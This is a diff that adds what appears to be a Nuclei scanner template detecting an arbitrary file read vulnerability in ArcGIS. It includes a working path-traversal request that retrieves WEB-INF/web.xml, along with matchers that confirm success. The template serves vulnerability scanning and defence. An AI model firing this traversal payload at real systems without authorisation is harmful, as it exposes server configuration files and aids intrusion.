@@ -1,0 +1,25 @@
+id: arcgis-geographic-info-system-anyfile-read
+info:
+  name: ArcGIS Geographic Information System Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,arbitrary-file-read,arcgis
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/arcgis/manager/3370/js//../WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<display-name>"
+          - "<filter-name>"
+          - "</web-app>"
+      - type: word
+        part: header
+        words:
+          - "application/xml"
